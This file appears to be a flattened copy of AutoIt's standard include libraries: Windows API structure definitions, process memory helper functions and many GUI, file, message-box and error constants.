Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
Global Const $tagmemmap = "handle hProc;ulong_ptr Size;ptr Mem"

Func _memfree(ByRef $tmemmap)
	Local $pmemory = DllStructGetData($tmemmap, "Mem")
	Local $hprocess = DllStructGetData($tmemmap, "hProc")
	Local $bresult = _memvirtualfreeex($hprocess, $pmemory, 0, $mem_release)
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess)
	If @error Then Return SetError(@error, @extended, False)
	Return $bresult
EndFunc

Func _memglobalalloc($ibytes, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $iflags, "ulong_ptr", $ibytes)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _memglobalfree($hmem)
	Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _memgloballock($hmem)
	Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _memglobalsize($hmem)
	Local $aresult = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _memglobalunlock($hmem)
	Local $aresult = DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _meminit($hwnd, $isize, ByRef $tmemmap)
	Local $aresult = DllCall("User32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Local $iprocessid = $aresult[2]
	If $iprocessid = 0 Then Return SetError(1, 0, 0)
	Local $iaccess = BitOR($process_vm_operation, $process_vm_read, $process_vm_write)
	Local $hprocess = __mem_openprocess($iaccess, False, $iprocessid, True)
	Local $ialloc = BitOR($mem_reserve, $mem_commit)
	Local $pmemory = _memvirtualallocex($hprocess, 0, $isize, $ialloc, $page_readwrite)
	If $pmemory = 0 Then Return SetError(2, 0, 0)
	$tmemmap = DllStructCreate($tagmemmap)
	DllStructSetData($tmemmap, "hProc", $hprocess)
	DllStructSetData($tmemmap, "Size", $isize)
	DllStructSetData($tmemmap, "Mem", $pmemory)
	Return $pmemory
EndFunc

Func _memmovememory($psource, $pdest, $ilength)
	DllCall("kernel32.dll", "none", "RtlMoveMemory", "struct*", $pdest, "struct*", $psource, "ulong_ptr", $ilength)
	If @error Then Return SetError(@error, @extended)
EndFunc

Func _memread(ByRef $tmemmap, $psrce, $pdest, $isize)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $psrce, "struct*", $pdest, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _memwrite(ByRef $tmemmap, $psrce, $pdest = 0, $isize = 0, $ssrce = "struct*")
	If $pdest = 0 Then $pdest = DllStructGetData($tmemmap, "Mem")
	If $isize = 0 Then $isize = DllStructGetData($tmemmap, "Size")
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $pdest, $ssrce, $psrce, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _memvirtualalloc($paddress, $isize, $iallocation, $iprotect)
	Local $aresult = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _memvirtualallocex($hprocess, $paddress, $isize, $iallocation, $iprotect)
	Local $aresult = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _memvirtualfree($paddress, $isize, $ifreetype)
	Local $aresult = DllCall("kernel32.dll", "bool", "VirtualFree", "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _memvirtualfreeex($hprocess, $paddress, $isize, $ifreetype)
	Local $aresult = DllCall("kernel32.dll", "bool", "VirtualFreeEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func __mem_openprocess($iaccess, $binherit, $iprocessid, $bdebugpriv = False)
	Local $aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $iprocessid)
	If @error Then Return SetError(@error + 10, @extended, 0)
	If $aresult[0] Then Return $aresult[0]
	If NOT $bdebugpriv Then Return 0
	Local $htoken = _security__openthreadtokenex(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error + 20, @extended, 0)
	_security__setprivilege($htoken, "SeDebugPrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $iret = 0
	If NOT @error Then
		$aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $iprocessid)
		$ierror = @error
		$ilasterror = @extended
		If $aresult[0] Then $iret = $aresult[0]
		_security__setprivilege($htoken, "SeDebugPrivilege", False)
		If @error Then
			$ierror = @error + 30
			$ilasterror = @extended
		EndIf
	Else
		$ierror = @error + 40
	EndIf
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
	Return SetError($ierror, $ilasterror, $iret)
EndFunc

Global Const $opt_coordsrelative = 0
Global Const $opt_coordsabsolute = 1
Global Const $opt_coordsclient = 2
Global Const $opt_errorsilent = 0
Global Const $opt_errorfatal = 1
Global Const $opt_capsnostore = 0
Global Const $opt_capsstore = 1
Global Const $opt_matchstart = 1
Global Const $opt_matchany = 2
Global Const $opt_matchexact = 3
Global Const $opt_matchadvanced = 4
Global Const $ccs_top = 1
Global Const $ccs_nomovey = 2
Global Const $ccs_bottom = 3
Global Const $ccs_noresize = 4
Global Const $ccs_noparentalign = 8
Global Const $ccs_nohilite = 16
Global Const $ccs_adjustable = 32
Global Const $ccs_nodivider = 64
Global Const $ccs_vert = 128
Global Const $ccs_left = 129
Global Const $ccs_nomovex = 130
Global Const $ccs_right = 131
Global Const $dt_drivetype = 1
Global Const $dt_ssdstatus = 2
Global Const $dt_bustype = 3
Global Const $objid_window = 0
Global Const $objid_titlebar = -2
Global Const $objid_sizegrip = -7
Global Const $objid_caret = -8
Global Const $objid_cursor = -9
Global Const $objid_alert = -10
Global Const $objid_sound = -11
Global Const $dlg_notitle = 1
Global Const $dlg_notontop = 2
Global Const $dlg_textleft = 4
Global Const $dlg_textright = 8
Global Const $dlg_moveable = 16
Global Const $dlg_textvcenter = 32
Global Const $idc_unknown = 0
Global Const $idc_appstarting = 1
Global Const $idc_arrow = 2
Global Const $idc_cross = 3
Global Const $idc_hand = 32649
Global Const $idc_help = 4
Global Const $idc_ibeam = 5
Global Const $idc_icon = 6
Global Const $idc_no = 7
Global Const $idc_size = 8
Global Const $idc_sizeall = 9
Global Const $idc_sizenesw = 10
Global Const $idc_sizens = 11
Global Const $idc_sizenwse = 12
Global Const $idc_sizewe = 13
Global Const $idc_uparrow = 14
Global Const $idc_wait = 15
Global Const $idi_application = 32512
Global Const $idi_asterisk = 32516
Global Const $idi_exclamation = 32515
Global Const $idi_hand = 32513
Global Const $idi_question = 32514
Global Const $idi_winlogo = 32517
Global Const $idi_shield = 32518
Global Const $idi_error = $idi_hand
Global Const $idi_information = $idi_asterisk
Global Const $idi_warning = $idi_exclamation
Global Const $sd_logoff = 0
Global Const $sd_shutdown = 1
Global Const $sd_reboot = 2
Global Const $sd_force = 4
Global Const $sd_powerdown = 8
Global Const $sd_forcehung = 16
Global Const $sd_standby = 32
Global Const $sd_hibernate = 64
Global Const $stdin_child = 1
Global Const $stdout_child = 2
Global Const $stderr_child = 4
Global Const $stderr_merged = 8
Global Const $stdio_inherit_parent = 16
Global Const $run_create_new_console = 65536
Global Const $ubound_dimensions = 0
Global Const $ubound_rows = 1
Global Const $ubound_columns = 2
Global Const $mouseeventf_absolute = 32768
Global Const $mouseeventf_move = 1
Global Const $mouseeventf_leftdown = 2
Global Const $mouseeventf_leftup = 4
Global Const $mouseeventf_rightdown = 8
Global Const $mouseeventf_rightup = 16
Global Const $mouseeventf_middledown = 32
Global Const $mouseeventf_middleup = 64
Global Const $mouseeventf_wheel = 2048
Global Const $mouseeventf_xdown = 128
Global Const $mouseeventf_xup = 256
Global Const $reg_none = 0
Global Const $reg_sz = 1
Global Const $reg_expand_sz = 2
Global Const $reg_binary = 3
Global Const $reg_dword = 4
Global Const $reg_dword_little_endian = 4
Global Const $reg_dword_big_endian = 5
Global Const $reg_link = 6
Global Const $reg_multi_sz = 7
Global Const $reg_resource_list = 8
Global Const $reg_full_resource_descriptor = 9
Global Const $reg_resource_requirements_list = 10
Global Const $reg_qword = 11
Global Const $reg_qword_little_endian = 11
Global Const $hwnd_bottom = 1
Global Const $hwnd_notopmost = -2
Global Const $hwnd_top = 0
Global Const $hwnd_topmost = -1
Global Const $swp_nosize = 1
Global Const $swp_nomove = 2
Global Const $swp_nozorder = 4
Global Const $swp_noredraw = 8
Global Const $swp_noactivate = 16
Global Const $swp_framechanged = 32
Global Const $swp_drawframe = 32
Global Const $swp_showwindow = 64
Global Const $swp_hidewindow = 128
Global Const $swp_nocopybits = 256
Global Const $swp_noownerzorder = 512
Global Const $swp_noreposition = 512
Global Const $swp_nosendchanging = 1024
Global Const $swp_defererase = 8192
Global Const $swp_asyncwindowpos = 16384
Global Const $keyword_default = 1
Global Const $keyword_null = 2
Global Const $fc_nooverwrite = 0
Global Const $fc_overwrite = 1
Global Const $fc_createpath = 8
Global Const $ft_modified = 0
Global Const $ft_created = 1
Global Const $ft_accessed = 2
Global Const $fo_read = 0
Global Const $fo_append = 1
Global Const $fo_overwrite = 2
Global Const $fo_createpath = 8
Global Const $fo_binary = 16
Global Const $fo_unicode = 32
Global Const $fo_utf16_le = 32
Global Const $fo_utf16_be = 64
Global Const $fo_utf8 = 128
Global Const $fo_utf8_nobom = 256
Global Const $fo_utf8_full = 16384
Global Const $eof = -1
Global Const $fd_filemustexist = 1
Global Const $fd_pathmustexist = 2
Global Const $fd_multiselect = 4
Global Const $fd_promptcreatenew = 8
Global Const $fd_promptoverwrite = 16
Global Const $create_new = 1
Global Const $create_always = 2
Global Const $open_existing = 3
Global Const $open_always = 4
Global Const $truncate_existing = 5
Global Const $invalid_set_file_pointer = -1
Global Const $file_begin = 0
Global Const $file_current = 1
Global Const $file_end = 2
Global Const $file_attribute_readonly = 1
Global Const $file_attribute_hidden = 2
Global Const $file_attribute_system = 4
Global Const $file_attribute_directory = 16
Global Const $file_attribute_archive = 32
Global Const $file_attribute_device = 64
Global Const $file_attribute_normal = 128
Global Const $file_attribute_temporary = 256
Global Const $file_attribute_sparse_file = 512
Global Const $file_attribute_reparse_point = 1024
Global Const $file_attribute_compressed = 2048
Global Const $file_attribute_offline = 4096
Global Const $file_attribute_not_content_indexed = 8192
Global Const $file_attribute_encrypted = 16384
Global Const $file_share_read = 1
Global Const $file_share_write = 2
Global Const $file_share_delete = 4
Global Const $file_share_readwrite = BitOR($file_share_read, $file_share_write)
Global Const $file_share_any = BitOR($file_share_read, $file_share_write, $file_share_delete)
Global Const $generic_all = 268435456
Global Const $generic_execute = 536870912
Global Const $generic_write = 1073741824
Global Const $generic_read = -2147483648
Global Const $generic_readwrite = BitOR($generic_read, $generic_write)
Global Const $frta_nocount = 0
Global Const $frta_count = 1
Global Const $frta_intarrays = 2
Global Const $frta_entiresplit = 4
Global Const $flta_filesfolders = 0
Global Const $flta_files = 1
Global Const $flta_folders = 2
Global Const $fltar_filesfolders = 0
Global Const $fltar_files = 1
Global Const $fltar_folders = 2
Global Const $fltar_nohidden = 4
Global Const $fltar_nosystem = 8
Global Const $fltar_nolink = 16
Global Const $fltar_norecur = 0
Global Const $fltar_recur = 1
Global Const $fltar_nosort = 0
Global Const $fltar_sort = 1
Global Const $fltar_fastsort = 2
Global Const $fltar_nopath = 0
Global Const $fltar_relpath = 1
Global Const $fltar_fullpath = 2
Global Const $mb_ok = 0
Global Const $mb_okcancel = 1
Global Const $mb_abortretryignore = 2
Global Const $mb_yesnocancel = 3
Global Const $mb_yesno = 4
Global Const $mb_retrycancel = 5
Global Const $mb_canceltrycontinue = 6
Global Const $mb_help = 16384
Global Const $mb_iconstop = 16
Global Const $mb_iconerror = 16
Global Const $mb_iconhand = 16
Global Const $mb_iconquestion = 32
Global Const $mb_iconexclamation = 48
Global Const $mb_iconwarning = 48
Global Const $mb_iconinformation = 64
Global Const $mb_iconasterisk = 64
Global Const $mb_usericon = 128
Global Const $mb_defbutton1 = 0
Global Const $mb_defbutton2 = 256
Global Const $mb_defbutton3 = 512
Global Const $mb_defbutton4 = 768
Global Const $mb_applmodal = 0
Global Const $mb_systemmodal = 4096
Global Const $mb_taskmodal = 8192
Global Const $mb_default_desktop_only = 131072
Global Const $mb_right = 524288
Global Const $mb_rtlreading = 1048576
Global Const $mb_setforeground = 65536
Global Const $mb_topmost = 262144
Global Const $mb_service_notification = 2097152
Global Const $mb_rightjustified = $mb_right
Global Const $idtimeout = -1
Global Const $idok = 1
Global Const $idcancel = 2
Global Const $idabort = 3
Global Const $idretry = 4
Global Const $idignore = 5
Global Const $idyes = 6
Global Const $idno = 7
Global Const $idclose = 8
Global Const $idhelp = 9
Global Const $idtryagain = 10
Global Const $idcontinue = 11

Func _sendmessage($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 AND $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc

Func _sendmessagea($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageA", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 AND $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc

Global Const $str_nocasesense = 0
Global Const $str_casesense = 1
Global Const $str_nocasesensebasic = 2
Global Const $str_stripleading = 1
Global Const $str_striptrailing = 2
Global Const $str_stripspaces = 4
Global Const $str_stripall = 8
Global Const $str_chrsplit = 0
Global Const $str_entiresplit = 1
Global Const $str_nocount = 2
Global Const $str_regexpmatch = 0
Global Const $str_regexparraymatch = 1
Global Const $str_regexparrayfullmatch = 2
Global Const $str_regexparrayglobalmatch = 3
Global Const $str_regexparrayglobalfullmatch = 4
Global Const $str_endisstart = 0
Global Const $str_endnotstart = 1
Global Const $hgdi_error = Ptr(-1)
Global Const $invalid_handle_value = Ptr(-1)
Global Const $clr_invalid = -1
Global Const $null_brush = 5
Global Const $null_pen = 8
Global Const $black_brush = 4
Global Const $dkgray_brush = 3
Global Const $dc_brush = 18
Global Const $gray_brush = 2
Global Const $hollow_brush = $null_brush
Global Const $ltgray_brush = 1
Global Const $white_brush = 0
Global Const $black_pen = 7
Global Const $dc_pen = 19
Global Const $white_pen = 6
Global Const $ansi_fixed_font = 11
Global Const $ansi_var_font = 12
Global Const $device_default_font = 14
Global Const $default_gui_font = 17
Global Const $oem_fixed_font = 10
Global Const $system_font = 13
Global Const $system_fixed_font = 16
Global Const $default_palette = 15
Global Const $mb_precomposed = 1
Global Const $mb_composite = 2
Global Const $mb_useglyphchars = 4
Global Const $ulw_alpha = 2
Global Const $ulw_colorkey = 1
Global Const $ulw_opaque = 4
Global Const $ulw_ex_noresize = 8
Global Const $wh_callwndproc = 4
Global Const $wh_callwndprocret = 12
Global Const $wh_cbt = 5
Global Const $wh_debug = 9
Global Const $wh_foregroundidle = 11
Global Const $wh_getmessage = 3
Global Const $wh_journalplayback = 1
Global Const $wh_journalrecord = 0
Global Const $wh_keyboard = 2
Global Const $wh_keyboard_ll = 13
Global Const $wh_mouse = 7
Global Const $wh_mouse_ll = 14
Global Const $wh_msgfilter = -1
Global Const $wh_shell = 10
Global Const $wh_sysmsgfilter = 6
Global Const $wpf_asyncwindowplacement = 4
Global Const $wpf_restoretomaximized = 2
Global Const $wpf_setminposition = 1
Global Const $kf_extended = 256
Global Const $kf_altdown = 8192
Global Const $kf_up = 32768
Global Const $llkhf_extended = BitShift($kf_extended, 8)
Global Const $llkhf_injected = 16
Global Const $llkhf_altdown = BitShift($kf_altdown, 8)
Global Const $llkhf_up = BitShift($kf_up, 8)
Global Const $ofn_allowmultiselect = 512
Global Const $ofn_createprompt = 8192
Global Const $ofn_dontaddtorecent = 33554432
Global Const $ofn_enablehook = 32
Global Const $ofn_enableincludenotify = 4194304
Global Const $ofn_enablesizing = 8388608
Global Const $ofn_enabletemplate = 64
Global Const $ofn_enabletemplatehandle = 128
Global Const $ofn_explorer = 524288
Global Const $ofn_extensiondifferent = 1024
Global Const $ofn_filemustexist = 4096
Global Const $ofn_forceshowhidden = 268435456
Global Const $ofn_hidereadonly = 4
Global Const $ofn_longnames = 2097152
Global Const $ofn_nochangedir = 8
Global Const $ofn_nodereferencelinks = 1048576
Global Const $ofn_nolongnames = 262144
Global Const $ofn_nonetworkbutton = 131072
Global Const $ofn_noreadonlyreturn = 32768
Global Const $ofn_notestfilecreate = 65536
Global Const $ofn_novalidate = 256
Global Const $ofn_overwriteprompt = 2
Global Const $ofn_pathmustexist = 2048
Global Const $ofn_readonly = 1
Global Const $ofn_shareaware = 16384
Global Const $ofn_showhelp = 16
Global Const $ofn_ex_noplacesbar = 1
Global Const $tmpf_fixed_pitch = 1
Global Const $tmpf_vector = 2
Global Const $tmpf_truetype = 4
Global Const $tmpf_device = 8
Global Const $duplicate_close_source = 1
Global Const $duplicate_same_access = 2
Global Const $di_mask = 1
Global Const $di_image = 2
Global Const $di_normal = 3
Global Const $di_compat = 4
Global Const $di_defaultsize = 8
Global Const $di_nomirror = 16
Global Const $display_device_attached_to_desktop = 1
Global Const $display_device_multi_driver = 2
Global Const $display_device_primary_device = 4
Global Const $display_device_mirroring_driver = 8
Global Const $display_device_vga_compatible = 16
Global Const $display_device_removable = 32
Global Const $display_device_disconnect = 33554432
Global Const $display_device_remote = 67108864
Global Const $display_device_modespruned = 134217728
Global Const $flashw_caption = 1
Global Const $flashw_tray = 2
Global Const $flashw_timer = 4
Global Const $flashw_timernofg = 12
Global Const $format_message_allocate_buffer = 256
Global Const $format_message_ignore_inserts = 512
Global Const $format_message_from_string = 1024
Global Const $format_message_from_hmodule = 2048
Global Const $format_message_from_system = 4096
Global Const $format_message_argument_array = 8192
Global Const $gw_hwndfirst = 0
Global Const $gw_hwndlast = 1
Global Const $gw_hwndnext = 2
Global Const $gw_hwndprev = 3
Global Const $gw_owner = 4
Global Const $gw_child = 5
Global Const $gw_enabledpopup = 6
Global Const $gwl_wndproc = -4
Global Const $gwl_hinstance = -6
Global Const $gwl_hwndparent = -8
Global Const $gwl_id = -12
Global Const $gwl_style = -16
Global Const $gwl_exstyle = -20
Global Const $gwl_userdata = -21
Global Const $std_cut = 0
Global Const $std_copy = 1
Global Const $std_paste = 2
Global Const $std_undo = 3
Global Const $std_redow = 4
Global Const $std_delete = 5
Global Const $std_filenew = 6
Global Const $std_fileopen = 7
Global Const $std_filesave = 8
Global Const $std_printpre = 9
Global Const $std_properties = 10
Global Const $std_help = 11
Global Const $std_find = 12
Global Const $std_replace = 13
Global Const $std_print = 14
Global Const $image_bitmap = 0
Global Const $image_icon = 1
Global Const $image_cursor = 2
Global Const $image_enhmetafile = 3
Global Const $kb_sendspecial = 0
Global Const $kb_sendraw = 1
Global Const $kb_capsoff = 0
Global Const $kb_capson = 1
Global Const $dont_resolve_dll_references = 1
Global Const $load_library_as_datafile = 2
Global Const $load_with_altered_search_path = 8
Global Const $load_ignore_code_authz_level = 16
Global Const $load_library_as_datafile_exclusive = 64
Global Const $load_library_as_image_resource = 32
Global Const $load_library_search_application_dir = 512
Global Const $load_library_search_default_dirs = 4096
Global Const $load_library_search_dll_load_dir = 256
Global Const $load_library_search_system32 = 2048
Global Const $load_library_search_user_dirs = 1024
Global Const $s_ok = 0
Global Const $e_abort = -2147467260
Global Const $e_accessdenied = -2147024891
Global Const $e_fail = -2147467259
Global Const $e_handle = -2147024890
Global Const $e_invalidarg = -2147024809
Global Const $e_nointerface = -2147467262
Global Const $e_notimpl = -2147467263
Global Const $e_outofmemory = -2147024882
Global Const $e_pointer = -2147467261
Global Const $e_unexpected = -2147418113
